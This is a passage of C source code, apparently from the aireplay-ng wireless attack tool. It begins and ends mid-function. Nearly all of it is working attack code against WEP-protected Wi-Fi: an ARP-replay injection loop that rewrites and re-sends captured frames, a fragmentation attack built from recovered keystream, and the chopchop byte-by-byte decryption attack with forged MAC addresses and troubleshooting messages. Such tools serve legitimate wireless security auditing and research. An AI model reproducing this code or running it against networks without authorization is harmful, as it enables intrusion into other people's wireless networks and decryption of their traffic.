{\n        /* avoid blocking on reading the socket */\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    tc = time( NULL ) - 11;\n\n    nb_pkt_read = 0;\n    nb_bad_pkt  = 0;\n    nb_ack_pkt  = 0;\n    nb_arp      = 0;\n    nb_arp_tot  = 0;\n    arp_off1    = 0;\n    arp_off2    = 0;\n\n    while( 1 )\n    {\n        /* sleep until the next clock tick */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rRead %ld packets (%ld ARPs, %ld ACKs), \"\n                    \"sent %ld packets...(%d pps)\\r\",\n                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)) );\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )\n        {\n            /* threshold reach, send one frame */\n\n            ticks[2] = 0;\n\n            if( nb_arp > 0 )\n            {\n                if( nb_pkt_sent == 0 )\n                    ticks[0] = 0;\n\n                if( send_packet( arp[arp_off1].buf,\n                                 arp[arp_off1].len ) < 0 )\n                    return( 1 );\n\n                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )\n                {\n                    if( send_packet( arp[arp_off1].buf,\n                                    arp[arp_off1].len ) < 0 )\n                        return( 1 );\n                }\n\n                if( ++arp_off1 >= nb_arp )\n                    arp_off1 = 0;\n            }\n        }\n\n        /* read a frame, and check if it's an ARP request */\n\n        if( opt.s_file == NULL )\n        {\n            gettimeofday( &tv, NULL );\n\n            caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n            if( caplen  < 0 ) return( 1 );\n            if( caplen == 0 ) continue;\n        }\n        else\n        {\n            n = sizeof( pkh );\n\n            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {\n                SWAP32( pkh.caplen );\n                SWAP32( pkh.len );\n            }\n\n            tv.tv_sec  = pkh.tv_sec;\n            tv.tv_usec = pkh.tv_usec;\n\n            n = caplen = pkh.caplen;\n\n            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )\n            {\n                printf( \"\\r\\33[KInvalid packet length %d.\\n\", n );\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )\n            {\n                opt.s_file = NULL;\n                continue;\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )\n            {\n                /* remove the prism header */\n\n                if( h80211[7] == 0x40 )\n                    n = 64;\n                else\n                    n = *(int *)( h80211 + 4 );\n\n                if( n < 8 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )\n            {\n                /* remove the radiotap header */\n\n                n = *(unsigned short *)( h80211 + 2 );\n\n                if( n <= 0 || n >= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n\n            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )\n            {\n                /* remove the PPI header */\n\n                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                /* for a while Kismet logged broken PPI headers */\n                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )\n                    n = 32;\n\n                if( n <= 0 || n>= (int) caplen )\n                    continue;\n\n                memcpy( tmpbuf, h80211, caplen );\n                caplen -= n;\n                memcpy( h80211, tmpbuf + n, caplen );\n            }\n        }\n\n        nb_pkt_read++;\n\n        /* check if it's a disas. or deauth packet */\n\n        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&\n            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )\n        {\n            nb_bad_pkt++;\n\n            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )\n            {\n                printf( \"\\33[KNotice: got a deauth/disassoc packet. Is the \"\n                        \"source MAC associated ?\\n\" );\n\n                tc = time( NULL );\n                nb_bad_pkt = 0;\n            }\n        }\n\n        if( h80211[0] == 0xD4 &&\n            ! memcmp( h80211 + 4, opt.f_bssid, 6 ) )\n        {\n            nb_ack_pkt++;\n        }\n\n        /* check if it's a potential ARP request */\n\n        opt.f_minlen = opt.f_maxlen = 68;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n            goto add_arp;\n\n        opt.f_minlen = opt.f_maxlen = 86;\n\n        if( filter_packet( h80211, caplen ) == 0 )\n        {\nadd_arp:\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            switch( h80211[1] & 3 )\n            {\n                case  2: /* FromDS */\n                {\n                    if(memcmp(h80211 + 4, BROADCAST, 6) == 0)\n                    {\n                        /* backup sender MAC */\n\n                        memset( senderMAC, 0, 6 );\n                        memcpy( senderMAC, h80211 + 16, 6 );\n\n                        /* rewrite to a ToDS packet */\n\n                        memcpy( h80211 + 4, opt.f_bssid,  6 );\n                        memcpy( h80211 + 10, opt.r_smac,  6 );\n                        memcpy( h80211 + 16, BROADCAST, 6 );\n\n                        h80211[1] = 0x41;   /* ToDS & WEP  */\n                    }\n                    else\n                    {\n                        nb_arp_tot++;\n                        continue;\n                    }\n\n                    break;\n                }\n                default:\n                    continue;\n            }\n\n//             h80211[0] = 0x08;   /* normal data */\n\n            /* if same IV, perhaps our own packet, skip it */\n\n            for( i = 0; i < nb_arp; i++ )\n            {\n                if( memcmp( h80211 + z, arp[i].buf + arp[i].hdrlen, 4 ) == 0 )\n                    break;\n            }\n\n            if( i < nb_arp )\n                continue;\n\n            if( caplen > 128)\n                continue;\n            /* add the ARP request in the ring buffer */\n\n            nb_arp_tot++;\n\n            /* Ring buffer size: by default: 8 ) */\n\n            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)\n                continue;\n            else {\n\n                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {\n                    perror( \"malloc failed\" );\n                    return( 1 );\n                }\n\n                memset(flip, 0, 4096);\n\n                /* flip the sender MAC to convert it into the source MAC  */\n                flip[16] ^= (opt.r_smac[0] ^ senderMAC[0]);\n                flip[17] ^= (opt.r_smac[1] ^ senderMAC[1]);\n                flip[18] ^= (opt.r_smac[2] ^ senderMAC[2]);\n                flip[19] ^= (opt.r_smac[3] ^ senderMAC[3]);\n                flip[20] ^= (opt.r_smac[4] ^ senderMAC[4]);\n                flip[21] ^= (opt.r_smac[5] ^ senderMAC[5]);\n                flip[25] ^= ((rand() % 255)+1); //flip random bits in last byte of sender IP\n\n                add_crc32_plain(flip, caplen-z-4-4);\n                for(i=0; i<caplen-z-4; i++)\n                {\n                    (h80211+z+4)[i] ^= flip[i];\n                }\n\n                memcpy( arp[nb_arp].buf, h80211, caplen );\n                arp[nb_arp].len = caplen;\n                arp[nb_arp].hdrlen = z;\n                nb_arp++;\n\n                pkh.tv_sec  = tv.tv_sec;\n                pkh.tv_usec = tv.tv_usec;\n                pkh.caplen  = caplen;\n                pkh.len     = caplen;\n\n                n = sizeof( pkh );\n\n                if( fwrite( &pkh, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                n = pkh.caplen;\n\n                if( fwrite( h80211, n, 1, f_cap_out ) != 1 ) {\n                    perror( \"fwrite failed\" );\n                    return( 1 );\n                }\n\n                fflush( f_cap_out );\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint set_clear_arp(unsigned char *buf, unsigned char *smac, unsigned char *dmac) //set first 22 bytes\n{\n    if(buf == NULL)\n        return -1;\n\n    memcpy(buf, S_LLC_SNAP_ARP, 8);\n    buf[8]  = 0x00;\n    buf[9]  = 0x01; //ethernet\n    buf[10] = 0x08; // IP\n    buf[11] = 0x00;\n    buf[12] = 0x06; //hardware size\n    buf[13] = 0x04; //protocol size\n    buf[14] = 0x00;\n    if(memcmp(dmac, BROADCAST, 6) == 0)\n        buf[15]  = 0x01; //request\n    else\n        buf[15]  = 0x02; //reply\n    memcpy(buf+16, smac, 6);\n\n    return 0;\n}\n\nint set_final_arp(unsigned char *buf, unsigned char *mymac)\n{\n    if(buf == NULL)\n        return -1;\n\n    //shifted by 10bytes to set source IP as target IP :)\n\n    buf[0] = 0x08; // IP\n    buf[1] = 0x00;\n    buf[2] = 0x06; //hardware size\n    buf[3] = 0x04; //protocol size\n    buf[4] = 0x00;\n    buf[5] = 0x01; //request\n    memcpy(buf+6, mymac, 6); //sender mac\n    buf[12] = 0xA9; //sender IP 169.254.87.197\n    buf[13] = 0xFE;\n    buf[14] = 0x57;\n    buf[15] = 0xC5; //end sender IP\n\n    return 0;\n}\n\nint set_clear_ip(unsigned char *buf, int ip_len) //set first 9 bytes\n{\n    if(buf == NULL)\n        return -1;\n\n    memcpy(buf, S_LLC_SNAP_IP, 8);\n    buf[8]  = 0x45;\n    buf[10] = (ip_len >> 8)  & 0xFF;\n    buf[11] = ip_len & 0xFF;\n\n    return 0;\n}\n\nint set_final_ip(unsigned char *buf, unsigned char *mymac)\n{\n    if(buf == NULL)\n        return -1;\n\n    //shifted by 10bytes to set source IP as target IP :)\n\n    buf[0] = 0x06; //hardware size\n    buf[1] = 0x04; //protocol size\n    buf[2] = 0x00;\n    buf[3] = 0x01; //request\n    memcpy(buf+4, mymac, 6); //sender mac\n    buf[10] = 0xA9; //sender IP from 169.254.XXX.XXX\n    buf[11] = 0xFE;\n\n    return 0;\n}\n\nint do_attack_cfrag( void )\n{\n    int caplen, n;\n    struct timeval tv;\n    struct timeval tv2;\n    float f, ticks[3];\n    unsigned char bssid[6];\n    unsigned char smac[6];\n    unsigned char dmac[6];\n    unsigned char keystream[128];\n    unsigned char frag1[128], frag2[128], frag3[128];\n    unsigned char clear[4096], final[4096], flip[4096];\n    int isarp;\n    int z, i;\n\n    opt.f_fromds = 0;\n\nread_packets:\n\n    if( capture_ask_packet( &caplen, 0 ) != 0 )\n        return( 1 );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n        z+=2;\n\n    if(caplen < z)\n    {\n        goto read_packets;\n    }\n\n    if(caplen > 3800)\n    {\n        goto read_packets;\n    }\n\n    switch( h80211[1] & 3 )\n    {\n        case  0:\n            memcpy( bssid, h80211 + 16, 6 );\n            memcpy( dmac, h80211 + 4, 6 );\n            memcpy( smac, h80211 + 10, 6 );\n            break;\n        case  1:\n            memcpy( bssid, h80211 + 4, 6 );\n            memcpy( dmac, h80211 + 16, 6 );\n            memcpy( smac, h80211 + 10, 6 );\n            break;\n        case  2:\n            memcpy( bssid, h80211 + 10, 6 );\n            memcpy( dmac, h80211 + 4, 6 );\n            memcpy( smac, h80211 + 16, 6 );\n            break;\n        default:\n            memcpy( bssid, h80211 + 10, 6 );\n            memcpy( dmac, h80211 + 16, 6 );\n            memcpy( smac, h80211 + 24, 6 );\n            break;\n    }\n\n    memset(clear, 0, 4096);\n    memset(final, 0, 4096);\n    memset(flip, 0, 4096);\n    memset(frag1, 0, 128);\n    memset(frag2, 0, 128);\n    memset(frag3, 0, 128);\n    memset(keystream, 0, 128);\n\n    /* check if it's a potential ARP request */\n\n    //its length 68-24 or 86-24 and going to broadcast or a unicast mac (even first byte)\n    if( (caplen-z == 68-24 || caplen-z == 86-24) && (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0]%2) == 0) )\n    {\n        /* process ARP */\n        printf(\"Found ARP packet\\n\");\n        isarp = 1;\n        //build the new packet\n        set_clear_arp(clear, smac, dmac);\n        set_final_arp(final, opt.r_smac);\n\n        for(i=0; i<14; i++)\n            keystream[i] = (h80211+z+4)[i] ^ clear[i];\n\n        // correct 80211 header\n//         h80211[0] = 0x08;    //data\n        if( (h80211[1] & 3) == 0x00 ) //ad-hoc\n        {\n            h80211[1] = 0x40;    //wep\n            memcpy(h80211+4, smac, 6);\n            memcpy(h80211+10, opt.r_smac, 6);\n            memcpy(h80211+16, bssid, 6);\n        }\n        else //tods\n        {\n            if(opt.f_tods == 1)\n            {\n                h80211[1] = 0x41;    //wep+ToDS\n                memcpy(h80211+4 , bssid, 6);\n                memcpy(h80211+10, opt.r_smac, 6);\n                memcpy(h80211+16, smac, 6);\n            }\n            else\n            {\n                h80211[1] = 0x42;    //wep+FromDS\n                memcpy(h80211+4, smac, 6);\n                memcpy(h80211+10, bssid, 6);\n                memcpy(h80211+16, opt.r_smac, 6);\n            }\n        }\n        h80211[22] = 0xD0; //frag = 0;\n        h80211[23] = 0x50;\n\n        //need to shift by 10 bytes; (add 1 frag in front)\n        memcpy(frag1, h80211, z+4); //copy 80211 header and IV\n        frag1[1] |= 0x04; //more frags\n        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 8);\n        frag1[z+4+8] = 0x00;\n        frag1[z+4+9] = 0x01; //ethernet\n        add_crc32(frag1+z+4, 10);\n        for(i=0; i<14; i++)\n            (frag1+z+4)[i] ^= keystream[i];\n        /* frag1 finished */\n\n        for(i=0; i<caplen; i++)\n            flip[i] = clear[i] ^ final[i];\n\n        add_crc32_plain(flip, caplen-z-4-4);\n\n        for(i=0; i<caplen-z-4; i++)\n            (h80211+z+4)[i] ^= flip[i];\n        h80211[22] = 0xD1; // frag = 1;\n\n        //ready to send frag1 / len=z+4+10+4 and h80211 / len = caplen\n    }\n    else\n    {\n        /* process IP */\n        printf(\"Found IP packet\\n\");\n        isarp = 0;\n        //build the new packet\n        set_clear_ip(clear, caplen-z-4-8-4); //caplen - ieee80211header - IVIDX - LLC/SNAP - ICV\n        set_final_ip(final, opt.r_smac);\n\n        for(i=0; i<8; i++)\n            keystream[i] = (h80211+z+4)[i] ^ clear[i];\n\n        // correct 80211 header\n//         h80211[0] = 0x08;    //data\n        if( (h80211[1] & 3) == 0x00 ) //ad-hoc\n        {\n            h80211[1] = 0x40;    //wep\n            memcpy(h80211+4, smac, 6);\n            memcpy(h80211+10, opt.r_smac, 6);\n            memcpy(h80211+16, bssid, 6);\n        }\n        else\n        {\n            if(opt.f_tods == 1)\n            {\n                h80211[1] = 0x41;    //wep+ToDS\n                memcpy(h80211+4 , bssid, 6);\n                memcpy(h80211+10, opt.r_smac, 6);\n                memcpy(h80211+16, smac, 6);\n            }\n            else\n            {\n                h80211[1] = 0x42;    //wep+FromDS\n                memcpy(h80211+4, smac, 6);\n                memcpy(h80211+10, bssid, 6);\n                memcpy(h80211+16, opt.r_smac, 6);\n            }\n        }\n        h80211[22] = 0xD0; //frag = 0;\n        h80211[23] = 0x50;\n\n        //need to shift by 12 bytes;(add 3 frags in front)\n        memcpy(frag1, h80211, z+4); //copy 80211 header and IV\n        memcpy(frag2, h80211, z+4); //copy 80211 header and IV\n        memcpy(frag3, h80211, z+4); //copy 80211 header and IV\n        frag1[1] |= 0x04; //more frags\n        frag2[1] |= 0x04; //more frags\n        frag3[1] |= 0x04; //more frags\n\n        memcpy(frag1+z+4, S_LLC_SNAP_ARP, 4);\n        add_crc32(frag1+z+4, 4);\n        for(i=0; i<8; i++)\n            (frag1+z+4)[i] ^= keystream[i];\n\n        memcpy(frag2+z+4, S_LLC_SNAP_ARP+4, 4);\n        add_crc32(frag2+z+4, 4);\n        for(i=0; i<8; i++)\n            (frag2+z+4)[i] ^= keystream[i];\n        frag2[22] = 0xD1; //frag = 1;\n\n        frag3[z+4+0] = 0x00;\n        frag3[z+4+1] = 0x01; //ether\n        frag3[z+4+2] = 0x08; //IP\n        frag3[z+4+3] = 0x00;\n        add_crc32(frag3+z+4, 4);\n        for(i=0; i<8; i++)\n            (frag3+z+4)[i] ^= keystream[i];\n        frag3[22] = 0xD2; //frag = 2;\n        /* frag1,2,3 finished */\n\n        for(i=0; i<caplen; i++)\n            flip[i] = clear[i] ^ final[i];\n\n        add_crc32_plain(flip, caplen-z-4-4);\n\n        for(i=0; i<caplen-z-4; i++)\n            (h80211+z+4)[i] ^= flip[i];\n        h80211[22] = 0xD3; // frag = 3;\n\n        //ready to send frag1,2,3 / len=z+4+4+4 and h80211 / len = caplen\n    }\n\n\n    /* loop resending the packet */\n\n\t/* Check if airodump-ng is running. If not, print that message */\n    printf( \"You should also start airodump-ng to capture replies.\\n\\n\" );\n\n    signal( SIGINT, sighandler );\n    ctrl_c = 0;\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    nb_pkt_sent = 0;\n\n    while( 1 )\n    {\n        if( ctrl_c )\n            goto read_packets;\n\n        /* wait for the next timer interrupt, or sleep */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"read(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;\n            ticks[1]++;\n            ticks[2]++;\n        }\n        else\n        {\n            /* we can't trust usleep, since it depends on the HZ */\n\n            gettimeofday( &tv,  NULL );\n            usleep( 1000000/RTC_RESOLUTION );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[1] += f / ( 1000000/RTC_RESOLUTION );\n            ticks[2] += f / ( 1000000/RTC_RESOLUTION );\n        }\n\n        /* update the status line */\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rSent %ld packets...(%d pps)\\33[K\\r\", nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)));\n            fflush( stdout );\n        }\n\n        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION < 1 )\n            continue;\n\n        /* threshold reached */\n\n        ticks[2] = 0;\n\n        if( nb_pkt_sent == 0 )\n            ticks[0] = 0;\n\n        if(isarp)\n        {\n            if( send_packet( frag1, z+4+10+4 ) < 0 )\n                return( 1 );\n            nb_pkt_sent--;\n        }\n        else\n        {\n            if( send_packet( frag1, z+4+4+4 ) < 0 )\n                return( 1 );\n            if( send_packet( frag2, z+4+4+4 ) < 0 )\n                return( 1 );\n            if( send_packet( frag3, z+4+4+4 ) < 0 )\n                return( 1 );\n            nb_pkt_sent-=3;\n        }\n        if( send_packet( h80211, caplen ) < 0 )\n            return( 1 );\n    }\n\n    return( 0 );\n}\n\nint do_attack_chopchop( void )\n{\n    float f, ticks[4];\n    int i, j, n, z, caplen, srcz;\n    int data_start, data_end, srcdiff, diff;\n    int guess, is_deauth_mode;\n    int nb_bad_pkt;\n    int tried_header_rec=0;\n\n    unsigned char b1 = 0xAA;\n    unsigned char b2 = 0xAA;\n\n    FILE *f_cap_out;\n    long nb_pkt_read;\n    unsigned long crc_mask;\n    unsigned char *chopped;\n\n    unsigned char packet[4096];\n\n    time_t tt;\n    struct tm *lt;\n    struct timeval tv;\n    struct timeval tv2;\n    struct pcap_file_header pfh_out;\n    struct pcap_pkthdr pkh;\n\n\n    if(getnet(NULL, 1, 0) != 0)\n        return 1;\n\n    srand( time( NULL ) );\n\n    if( capture_ask_packet( &caplen, 0 ) != 0 )\n        return( 1 );\n\n    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n        z+=2;\n    srcz = z;\n\n    if( (unsigned)caplen > sizeof(srcbuf) || (unsigned)caplen > sizeof(h80211) )\n        return( 1 );\n\n    if( opt.r_smac_set == 1 )\n    {\n        //handle picky APs (send one valid packet before all the invalid ones)\n        memset(packet, 0, sizeof(packet));\n\n        memcpy( packet, NULL_DATA, 24 );\n        memcpy( packet +  4, \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\", 6 );\n        memcpy( packet + 10, opt.r_smac,  6 );\n        memcpy( packet + 16, opt.f_bssid, 6 );\n\n        packet[0] = 0x08; //make it a data packet\n        packet[1] = 0x41; //set encryption and ToDS=1\n\n        memcpy( packet+24, h80211+z, caplen-z);\n\n        if( send_packet( packet, caplen-z+24 ) != 0 )\n            return( 1 );\n        //done sending a correct packet\n    }\n\n    /* Special handling for spanning-tree packets */\n    if ( memcmp( h80211 +  4, SPANTREE, 6 ) == 0 ||\n        memcmp( h80211 + 16, SPANTREE, 6 ) == 0 )\n    {\n        b1 = 0x42; b2 = 0x42;\n    }\n\n    printf( \"\\n\" );\n\n    /* chopchop operation mode: truncate and decrypt the packet */\n    /* we assume the plaintext starts with  AA AA 03 00 00 00   */\n    /* (42 42 03 00 00 00 for spanning-tree packets)            */\n\n    memcpy( srcbuf, h80211, caplen );\n\n    /* setup the chopping buffer */\n\n    n = caplen - z + 24;\n\n    if( ( chopped = (unsigned char *) malloc( n ) ) == NULL )\n    {\n        perror( \"malloc failed\" );\n        return( 1 );\n    }\n\n    memset( chopped, 0, n );\n\n    data_start = 24 + 4;\n    data_end   = n;\n    srcdiff = z-24;\n\n    chopped[0] = 0x08;  /* normal data frame */\n    chopped[1] = 0x41;  /* WEP = 1, ToDS = 1 */\n\n    /* copy the duration */\n\n    memcpy( chopped + 2, h80211 + 2, 2 );\n\n    /* copy the BSSID */\n\n    switch( h80211[1] & 3 )\n    {\n        case  0: memcpy( chopped + 4, h80211 + 16, 6 ); break;\n        case  1: memcpy( chopped + 4, h80211 +  4, 6 ); break;\n        case  2: memcpy( chopped + 4, h80211 + 10, 6 ); break;\n        default: memcpy( chopped + 4, h80211 + 10, 6 ); break;\n    }\n\n    /* copy the WEP IV */\n\n    memcpy( chopped + 24, h80211 + z, 4 );\n\n    /* setup the xor mask to hide the original data */\n\n    crc_mask = 0;\n\n    for( i = data_start; i < data_end - 4; i++ )\n    {\n        switch( i - data_start )\n        {\n            case  0: chopped[i] = b1 ^ 0xE0; break;\n            case  1: chopped[i] = b2 ^ 0xE0; break;\n            case  2: chopped[i] = 0x03 ^ 0x03; break;\n            default: chopped[i] = 0x55 ^ ( i & 0xFF ); break;\n        }\n\n        crc_mask = crc_tbl[crc_mask & 0xFF]\n                 ^ ( crc_mask   >>  8 )\n                 ^ ( chopped[i] << 24 );\n    }\n\n    for( i = 0; i < 4; i++ )\n        crc_mask = crc_tbl[crc_mask & 0xFF]\n                 ^ ( crc_mask >> 8 );\n\n    chopped[data_end - 4] = crc_mask; crc_mask >>= 8;\n    chopped[data_end - 3] = crc_mask; crc_mask >>= 8;\n    chopped[data_end - 2] = crc_mask; crc_mask >>= 8;\n    chopped[data_end - 1] = crc_mask; crc_mask >>= 8;\n\n    for( i = data_start; i < data_end; i++ )\n        chopped[i] ^= srcbuf[i+srcdiff];\n\n    data_start += 6; /* skip the SNAP header */\n\n    /* if the replay source mac is unspecified, forge one */\n\n    if( opt.r_smac_set == 0 )\n    {\n        is_deauth_mode = 1;\n\n        opt.r_smac[0] = 0x00;\n        opt.r_smac[1] = rand() & 0x3E;\n        opt.r_smac[2] = rand() & 0xFF;\n        opt.r_smac[3] = rand() & 0xFF;\n        opt.r_smac[4] = rand() & 0xFF;\n\n        memcpy( opt.r_dmac, \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\", 6 );\n    }\n    else\n    {\n        is_deauth_mode = 0;\n\n        opt.r_dmac[0] = 0xFF;\n        opt.r_dmac[1] = rand() & 0xFE;\n        opt.r_dmac[2] = rand() & 0xFF;\n        opt.r_dmac[3] = rand() & 0xFF;\n        opt.r_dmac[4] = rand() & 0xFF;\n    }\n\n    /* let's go chopping */\n\n    memset( ticks, 0, sizeof( ticks ) );\n\n    nb_pkt_read = 0;\n    nb_pkt_sent = 0;\n    nb_bad_pkt  = 0;\n    guess       = 256;\n\n    tt = time( NULL );\n\n    alarm( 30 );\n\n    signal( SIGALRM, sighandler );\n\n    if(opt.port_in <= 0)\n    {\n        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )\n        {\n            perror( \"fcntl(O_NONBLOCK) failed\" );\n            return( 1 );\n        }\n    }\n\n    while( data_end > data_start )\n    {\n        if( alarmed )\n        {\n            printf( \"\\n\\n\"\n\"The chopchop attack appears to have failed. Possible reasons:\\n\"\n\"\\n\"\n\"    * You're trying to inject with an unsupported chipset (Centrino?).\\n\"\n\"    * The driver source wasn't properly patched for injection support.\\n\"\n\"    * You are too far from the AP. Get closer or reduce the send rate.\\n\"\n\"    * Target is 802.11g only but you are using a Prism2 or RTL8180.\\n\"\n\"    * The wireless interface isn't setup on the correct channel.\\n\" );\n            if( is_deauth_mode )\n                printf(\n\"    * The AP isn't vulnerable when operating in non-authenticated mode.\\n\"\n\"      Run aireplay-ng in authenticated mode instead (-h option).\\n\\n\" );\n            else\n                printf(\n\"    * The client MAC you have specified is not currently authenticated.\\n\"\n\"      Try running another aireplay-ng to fake authentication (attack \\\"-1\\\").\\n\"\n\"    * The AP isn't vulnerable when operating in authenticated mode.\\n\"\n\"      Try aireplay-ng in non-authenticated mode instead (no -h option).\\n\\n\" );\n            return( 1 );\n        }\n\n        /* wait for the next timer interrupt, or sleep */\n\n        if( dev.fd_rtc >= 0 )\n        {\n            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )\n            {\n                perror( \"\\nread(/dev/rtc) failed\" );\n                return( 1 );\n            }\n\n            ticks[0]++;  /* ticks since we entered the while loop     */\n            ticks[1]++;  /* ticks since the last status line update   */\n            ticks[2]++;  /* ticks since the last frame was sent       */\n            ticks[3]++;  /* ticks since started chopping current byte */\n        }\n        else\n        {\n            /* we can't trust usleep, since it depends on the HZ */\n\n            gettimeofday( &tv,  NULL );\n            usleep( 976 );\n            gettimeofday( &tv2, NULL );\n\n            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )\n                        + (float) ( tv2.tv_usec - tv.tv_usec );\n\n            ticks[0] += f / 976;\n            ticks[1] += f / 976;\n            ticks[2] += f / 976;\n            ticks[3] += f / 976;\n        }\n\n        /* update the status line */\n\n        if( ticks[1] > (RTC_RESOLUTION/10) )\n        {\n            ticks[1] = 0;\n            printf( \"\\rSent %3ld packets, current guess: %02X...\\33[K\",\n                    nb_pkt_sent, guess );\n            fflush( stdout );\n        }\n\n        if( data_end < 41 && ticks[3] > 8 * ( ticks[0] - ticks[3] ) /\n                                (int) ( caplen - ( data_end - 1 ) ) )\n        {\n            header_rec:\n\n            printf( \"\\n\\nThe AP appears to drop packets shorter \"\n                    \"than %d bytes.\\n\",data_end );\n\n            data_end = 40;\n\n            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                z+=2;\n\n            diff = z-24;\n\n            if( ( chopped[data_end + 0] ^ srcbuf[data_end + srcdiff + 0] ) == 0x06 &&\n                ( chopped[data_end + 1] ^ srcbuf[data_end + srcdiff + 1] ) == 0x04 &&\n                ( chopped[data_end + 2] ^ srcbuf[data_end + srcdiff + 2] ) == 0x00 )\n            {\n                printf( \"Enabling standard workaround: \"\n                        \"ARP header re-creation.\\n\" );\n\n                chopped[24 + 10] = srcbuf[srcz + 10] ^ 0x08;\n                chopped[24 + 11] = srcbuf[srcz + 11] ^ 0x06;\n                chopped[24 + 12] = srcbuf[srcz + 12] ^ 0x00;\n                chopped[24 + 13] = srcbuf[srcz + 13] ^ 0x01;\n                chopped[24 + 14] = srcbuf[srcz + 14] ^ 0x08;\n                chopped[24 + 15] = srcbuf[srcz + 15] ^ 0x00;\n            }\n            else\n            {\n                printf( \"Enabling standard workaround: \"\n                        \" IP header re-creation.\\n\" );\n\n                n = caplen - ( z + 16 );\n\n                chopped[24 +  4] = srcbuf[srcz +  4] ^ 0xAA;\n                chopped[24 +  5] = srcbuf[srcz +  5] ^ 0xAA;\n                chopped[24 +  6] = srcbuf[srcz +  6] ^ 0x03;\n                chopped[24 +  7] = srcbuf[srcz +  7] ^ 0x00;\n                chopped[24 +  8] = srcbuf[srcz +  8] ^ 0x00;\n                chopped[24 +  9] = srcbuf[srcz +  9] ^ 0x00;\n                chopped[24 + 10] = srcbuf[srcz + 10] ^ 0x08;\n                chopped[24 + 11] = srcbuf[srcz + 11] ^ 0x00;\n                chopped[24 + 14] = srcbuf[srcz + 14] ^ ( n >> 8 );\n                chopped[24 + 15] = srcbuf[srcz + 15] ^ ( n & 0xFF );\n\n                memcpy( h80211, srcbuf, caplen );\n\n                for( i = z + 4; i < (int) caplen; i++ )\n                    h80211[i - 4] = 